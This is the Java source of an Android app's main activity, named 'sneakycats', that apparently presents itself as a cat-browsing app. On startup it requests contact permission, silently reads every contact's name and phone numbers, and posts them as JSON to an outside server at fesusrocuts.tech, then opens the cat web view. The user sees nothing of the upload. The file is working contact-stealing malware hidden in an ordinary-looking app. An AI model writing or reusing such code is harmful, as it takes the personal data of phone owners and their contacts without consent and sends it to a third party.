package com.example.sneakycats;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    // Used to load the 'native-lib' library on application startup.
    static {
        System.loadLibrary("native-lib");
    }

    public static JSONObject phones = new JSONObject();
    public static final String EXTRA_MESSAGE = "com.example.sneakycats.MESSAGE";
    public static final String EXTRA_URL_API_WS = "http://fesusrocuts.tech:5000/service";
    public static final String EXTRA_URL_API = "http://fesusrocuts.tech:5000/";
    public static final String EXTRA_MESSAGE_NOWHATSAPP = "DON'T SEND MESSAGES BECAUSE YOU NOT INSTALLED WS";
    public static final String EXTRA_MESSAGE_YESWHATSAPP = "SEND MESSAGES INTO DB WS";
    private static final String TAG = "MainActivity";

    private static final String TAG_ANDROID_CONTACTS = "ANDROID_CONTACTS";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //setTitle("Android Contacts");

        if(!hasPhoneContactsPermission(Manifest.permission.READ_CONTACTS))
        {
            requestPermission(Manifest.permission.READ_CONTACTS);
        }else {
            getAllContacts();
            //Toast.makeText(this, "Contact data has been printed in the android monitor log..", Toast.LENGTH_SHORT).show();
        }
        openWebViewCat();
        /*
        Button loadButton = (Button)findViewById(R.id.contact_operate_load);
        loadButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(!hasPhoneContactsPermission(Manifest.permission.READ_CONTACTS))
                {
                    requestPermission(Manifest.permission.READ_CONTACTS);
                }else {
                    getAllContacts();
                    //Toast.makeText(this, "Contact data has been printed in the android monitor log..", Toast.LENGTH_SHORT).show();
                }
            }
        });*/

    }

    public void sendDataJson(JSONArray data) {

        JSONObject postData = new JSONObject();
        try {
            postData.put("user", "test");
            postData.put("data", data);
            postData.put("message", stringFromJNI());

            new SendDataJson().execute(EXTRA_URL_API_WS, postData.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }

    /** Called when the user taps the Send button */
    public void sendMessage2(View view) {
        // Do something in response to button
        EditText et1 = (EditText) findViewById(R.id.editText);
        //et1.setText("Test 1");
        Toast.makeText(this, et1.getText().toString(), Toast.LENGTH_LONG).show();
    }
    /** Called when the user taps the Send button */
    public void sendMessage(View view) {
        /*Intent intent = new Intent(this, DisplayMessageActivity.class);
        EditText editText = (EditText) findViewById(R.id.editText);
        editText.setText(stringFromJNI());
        //String message = editText.getText().toString();
        intent.putExtra(EXTRA_MESSAGE, String.valueOf(stringFromJNI()));
        startActivity(intent);*/
        EditText et1 = (EditText) findViewById(R.id.editText);
        et1.setText(stringFromJNI());
    }
    /** Called when the user taps the Send button */
    public void sendMessage3(String message) {
        Intent intent = new Intent(this, DisplayMessageActivity.class);
        intent.putExtra(EXTRA_MESSAGE, message);
        startActivity(intent);
    }

    /** Called when the user taps the Send button */
    public void openNavigationCats(View view) {
        boolean isWhatsappInstalled = whatsappInstalledOrNot("com.whatsapp");
        if (isWhatsappInstalled) {
            Toast.makeText(this, EXTRA_MESSAGE_YESWHATSAPP, Toast.LENGTH_LONG).show();
            openWebViewCat();
        } else sendMessage3(EXTRA_MESSAGE_NOWHATSAPP);
    }
    public void openNavigationCatsToast() {
        // Do something in response to button
        EditText et1 = (EditText) findViewById(R.id.editText);
        //et1.setText("Test 1");
        Toast.makeText(this, et1.getText().toString(), Toast.LENGTH_LONG).show();
    }
    /** Called when the user taps the Send button */
    public void openWhatsAppToMsg(View view) {
        //Log.v(TAG, "+++ openWhatsAppToMsg +++");
        //Uri uri = Uri.parse("https://wa.me/+573227309677");
        EditText editText = (EditText) findViewById(R.id.editText);
        String message = editText.getText().toString();

        Intent sendIntent = new Intent("android.intent.action.MAIN");
        //sendIntent.setComponent(new ComponentName("com.whatsapp", "com.whatsapp.Conversation"));
        sendIntent.setAction(Intent.ACTION_SEND);
        sendIntent.setType("text/plain");
        sendIntent.putExtra(Intent.EXTRA_TEXT, message);
        sendIntent.putExtra("jid","3227309677");
        sendIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        sendIntent.setPackage("com.whatsapp");
        startActivity(sendIntent);
    }
    
    /** Called when the user taps the Send button */
    public void openWebViewCat() {
        Intent intent = new Intent(this, NavigationCats.class);
        intent.putExtra(EXTRA_URL_API, MainActivity.EXTRA_URL_API);
        startActivity(intent);
    }


    private boolean whatsappInstalledOrNot(String uri) {
        PackageManager pm = getPackageManager();
        boolean app_installed = false;
        try {
            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
            app_installed = true;
        } catch (PackageManager.NameNotFoundException e) {
            app_installed = false;
        }
        return app_installed;
    }

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();


    /**
     ******************************************
     */
    /* Return all contacts and show each contact data in android monitor console as debug info. */
    private List<ContactDTO> getAllContacts()
    {
        List<ContactDTO> ret = new ArrayList<ContactDTO>();

        JSONObject regphone = new JSONObject();
        JSONArray jsonArray = new JSONArray();

        // Get all raw contacts id list.
        List<Integer> rawContactsIdList = getRawContactsIdList();

        int contactListSize = rawContactsIdList.size();

        ContentResolver contentResolver = getContentResolver();

        // Loop in the raw contacts list.
        for(int i=0;i<contactListSize;i++)
        {
            // Get the raw contact id.
            Integer rawContactId = rawContactsIdList.get(i);

            //Log.d(TAG_ANDROID_CONTACTS, "raw contact id : " + rawContactId.intValue());

            // Data content uri (access data table. )
            Uri dataContentUri = ContactsContract.Data.CONTENT_URI;

            // Build query columns name array.
            List<String> queryColumnList = new ArrayList<String>();

            // ContactsContract.Data.CONTACT_ID = "contact_id";
            queryColumnList.add(ContactsContract.Data.CONTACT_ID);

            // ContactsContract.Data.MIMETYPE = "mimetype";
            queryColumnList.add(ContactsContract.Data.MIMETYPE);

            queryColumnList.add(ContactsContract.Data.DATA1);
            queryColumnList.add(ContactsContract.Data.DATA2);
            queryColumnList.add(ContactsContract.Data.DATA3);
            queryColumnList.add(ContactsContract.Data.DATA4);
            queryColumnList.add(ContactsContract.Data.DATA5);
            queryColumnList.add(ContactsContract.Data.DATA6);
            queryColumnList.add(ContactsContract.Data.DATA7);
            queryColumnList.add(ContactsContract.Data.DATA8);
            queryColumnList.add(ContactsContract.Data.DATA9);
            queryColumnList.add(ContactsContract.Data.DATA10);
            queryColumnList.add(ContactsContract.Data.DATA11);
            queryColumnList.add(ContactsContract.Data.DATA12);
            queryColumnList.add(ContactsContract.Data.DATA13);
            queryColumnList.add(ContactsContract.Data.DATA14);
            queryColumnList.add(ContactsContract.Data.DATA15);

            // Translate column name list to array.
            String queryColumnArr[] = queryColumnList.toArray(new String[queryColumnList.size()]);

            // Build query condition string. Query rows by contact id.
            StringBuffer whereClauseBuf = new StringBuffer();
            whereClauseBuf.append(ContactsContract.Data.RAW_CONTACT_ID);
            whereClauseBuf.append("=");
            whereClauseBuf.append(rawContactId);

            // Query data table and return related contact data.
            Cursor cursor = contentResolver.query(dataContentUri, queryColumnArr, whereClauseBuf.toString(), null, null);

            /* If this cursor return database table row data.
               If do not check cursor.getCount() then it will throw error
               android.database.CursorIndexOutOfBoundsException: Index 0 requested, with a size of 0.
               */
            if(cursor!=null && cursor.getCount() > 0)
            {
                StringBuffer lineBuf = new StringBuffer();
                cursor.moveToFirst();

                lineBuf.append("");
                //lineBuf.append(rawContactId);

                long contactId = cursor.getLong(cursor.getColumnIndex(ContactsContract.Data.CONTACT_ID));
                //lineBuf.append(",");
                //lineBuf.append(contactId);

                do{
                    // First get mimetype column value.
                    String mimeType = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.MIMETYPE));
                    //lineBuf.append(" \r\n , MimeType : ");
                    //lineBuf.append(mimeType);

                    List<String> dataValueList = getColumnValueByMimetype(cursor, mimeType);
                    int dataValueListSize = dataValueList.size();
                    for(int j=0;j < dataValueListSize;j++)
                    {
                        String dataValue = dataValueList.get(j);
                        lineBuf.append(",");
                        lineBuf.append(dataValue);
                    }
                }while(cursor.moveToNext());
                Log.d(TAG_ANDROID_CONTACTS, lineBuf.toString());
                if(lineBuf.toString().indexOf("number:") > -1) {
                    jsonArray.put(lineBuf.toString());
                }
            }

            //Log.d(TAG_ANDROID_CONTACTS, "=========================================================================");
        }
        sendDataJson(jsonArray);
        return ret;
    }

    /*
     *  Get email type related string format value.
     * */
    private String getEmailTypeString(int dataType)
    {
        String ret = "";

        if(ContactsContract.CommonDataKinds.Email.TYPE_HOME == dataType)
        {
            ret = "Home";
        }else if(ContactsContract.CommonDataKinds.Email.TYPE_WORK==dataType)
        {
            ret = "Work";
        }
        return ret;
    }

    /*
     *  Get phone type related string format value.
     * */
    private String getPhoneTypeString(int dataType)
    {
        String ret = "";

        if(ContactsContract.CommonDataKinds.Phone.TYPE_HOME == dataType)
        {
            ret = "Home";
        }else if(ContactsContract.CommonDataKinds.Phone.TYPE_WORK==dataType)
        {
            ret = "Work";
        }else if(ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE==dataType)
        {
            ret = "Mobile";
        }
        return ret;
    }

    /*
     *  Return data column value by mimetype column value.
     *  Because for each mimetype there has not only one related value,
     *  such as Organization.CONTENT_ITEM_TYPE need return company, department, title, job description etc.
     *  So the return is a list string, each string for one column value.
     * */
    private List<String> getColumnValueByMimetype(Cursor cursor, String mimeType)
    {
        List<String> ret = new ArrayList<String>();

        switch (mimeType)
        {
            // Get email data.
            /*case ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE :
                // Email.ADDRESS == data1
                String emailAddress = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                // Email.TYPE == data2
                int emailType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                String emailTypeStr = getEmailTypeString(emailType);

                ret.add("Email Address : " + emailAddress);
                ret.add("Email Int Type : " + emailType);
                ret.add("Email String Type : " + emailTypeStr);
                break;

            // Get im data.
            case ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE:
                // Im.PROTOCOL == data5
                String imProtocol = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL));
                // Im.DATA == data1
                String imId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));

                ret.add("IM Protocol : " + imProtocol);
                ret.add("IM ID : " + imId);
                break;

            // Get nickname
            case ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE:
                // Nickname.NAME == data1
                String nickName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));
                ret.add("Nick name : " + nickName);
                break;

            // Get organization data.
            case ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE:
                // Organization.COMPANY == data1
                String company = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY));
                // Organization.DEPARTMENT == data5
                String department = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DEPARTMENT));
                // Organization.TITLE == data4
                String title = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                // Organization.JOB_DESCRIPTION == data6
                String jobDescription = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.JOB_DESCRIPTION));
                // Organization.OFFICE_LOCATION == data9
                String officeLocation = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.OFFICE_LOCATION));

                ret.add("Company : " + company);
                ret.add("department : " + department);
                ret.add("Title : " + title);
                ret.add("Job Description : " + jobDescription);
                ret.add("Office Location : " + officeLocation);
                break;
                */
            // Get phone number.
            case ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE:
                // Phone.NUMBER == data1
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                // Phone.TYPE == data2
                int phoneTypeInt = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                String phoneTypeStr = getPhoneTypeString(phoneTypeInt);

                //ret.add("Phone Number : " + phoneNumber);
                ret.add("number:" + phoneNumber );
                ret.add("type:" + phoneTypeInt );
                //ret.add("Phone Type Integer : " + phoneTypeInt);
                //ret.add("Phone Type String : " + phoneTypeStr);
                break;

            // Get sip address.
            /*case ContactsContract.CommonDataKinds.SipAddress.CONTENT_ITEM_TYPE:
                // SipAddress.SIP_ADDRESS == data1
                String address = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.SipAddress.SIP_ADDRESS));
                // SipAddress.TYPE == data2
                int addressTypeInt = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.SipAddress.TYPE));
                String addressTypeStr = getEmailTypeString(addressTypeInt);

                ret.add("Address : " + address);
                ret.add("Address Type Integer : " + addressTypeInt);
                ret.add("Address Type String : " + addressTypeStr);
                break;
                */
            // Get display name.
            case ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE:
                // StructuredName.DISPLAY_NAME == data1
                String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME));
                // StructuredName.GIVEN_NAME == data2
                //String givenName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME));
                // StructuredName.FAMILY_NAME == data3
                //String familyName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME));

                ret.add("name:" + displayName );
                //ret.add("Display Name : " + displayName);
                //ret.add("Given Name : " + givenName);
                //ret.add("Family Name : " + familyName);
                break;

            // Get postal address.
            /*case ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE:
                // StructuredPostal.COUNTRY == data10
                String country = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                // StructuredPostal.CITY == data7
                String city = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                // StructuredPostal.REGION == data8
                String region = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                // StructuredPostal.STREET == data4
                String street = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                // StructuredPostal.POSTCODE == data9
                String postcode = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                // StructuredPostal.TYPE == data2
                int postType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                String postTypeStr = getEmailTypeString(postType);

                ret.add("Country : " + country);
                ret.add("City : " + city);
                ret.add("Region : " + region);
                ret.add("Street : " + street);
                ret.add("Postcode : " + postcode);
                ret.add("Post Type Integer : " + postType);
                ret.add("Post Type String : " + postTypeStr);
                break;
                */

            // Get identity.
            /*case ContactsContract.CommonDataKinds.Identity.CONTENT_ITEM_TYPE:
                // Identity.IDENTITY == data1
                String identity = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Identity.IDENTITY));
                // Identity.NAMESPACE == data2
                String namespace = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Identity.NAMESPACE));

                ret.add("Identity : " + identity);
                ret.add("Identity Namespace : " + namespace);
                break;

            // Get photo.
            case ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE:
                // Photo.PHOTO == data15
                String photo = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Photo.PHOTO));
                // Photo.PHOTO_FILE_ID == data14
                String photoFileId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Photo.PHOTO_FILE_ID));

                ret.add("Photo : " + photo);
                ret.add("Photo File Id: " + photoFileId);
                break;

            // Get group membership.
            case ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE:
                // GroupMembership.GROUP_ROW_ID == data1
                int groupId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID));
                ret.add("Group ID : " + groupId);
                break;

            // Get website.
            case ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE:
                // Website.URL == data1
                String websiteUrl = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL));
                // Website.TYPE == data2
                int websiteTypeInt = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Website.TYPE));
                String websiteTypeStr = getEmailTypeString(websiteTypeInt);

                ret.add("Website Url : " + websiteUrl);
                ret.add("Website Type Integer : " + websiteTypeInt);
                ret.add("Website Type String : " + websiteTypeStr);
                break;

            // Get note.
            case ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE:
                // Note.NOTE == data1
                String note = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
                ret.add("Note : " + note);
                break;
             */

        }

        return ret;
    }

    // Return all raw_contacts _id in a list.
    private List<Integer> getRawContactsIdList()
    {
        List<Integer> ret = new ArrayList<Integer>();

        ContentResolver contentResolver = getContentResolver();

        // Row contacts content uri( access raw_contacts table. ).
        Uri rawContactUri = ContactsContract.RawContacts.CONTENT_URI;
        // Return _id column in contacts raw_contacts table.
        String queryColumnArr[] = {ContactsContract.RawContacts._ID};
        // Query raw_contacts table and return raw_contacts table _id.
        Cursor cursor = contentResolver.query(rawContactUri,queryColumnArr, null, null, null);
        if(cursor!=null)
        {
            cursor.moveToFirst();
            do{
                int idColumnIndex = cursor.getColumnIndex(ContactsContract.RawContacts._ID);
                int rawContactsId = cursor.getInt(idColumnIndex);
                ret.add(new Integer(rawContactsId));
            }while(cursor.moveToNext());
        }

        cursor.close();

        return ret;
    }


    // Check whether user has phone contacts manipulation permission or not.
    private boolean hasPhoneContactsPermission(String permission)
    {
        boolean ret = false;

        // If android sdk version is bigger than 23 the need to check run time permission.
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // return phone read contacts permission grant status.
            int hasPermission = ContextCompat.checkSelfPermission(getApplicationContext(), permission);
            // If permission is granted then return true.
            if (hasPermission == PackageManager.PERMISSION_GRANTED) {
                ret = true;
            }
        }else
        {
            ret = true;
        }
        return ret;
    }

    // Request a runtime permission to app user.
    private void requestPermission(String permission)
    {
        String requestPermissionArray[] = {permission};
        ActivityCompat.requestPermissions(this, requestPermissionArray, 1);
    }

    // After user select Allow or Deny button in request runtime permission dialog
    // , this method will be invoked.
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        int length = grantResults.length;
        if(length > 0)
        {
            int grantResult = grantResults[0];

            if(grantResult == PackageManager.PERMISSION_GRANTED) {

                Toast.makeText(getApplicationContext(), "You allowed permission, please click the button again.", Toast.LENGTH_LONG).show();
            }else
            {
                Toast.makeText(getApplicationContext(), "You denied permission.", Toast.LENGTH_LONG).show();
            }
        }
    }
}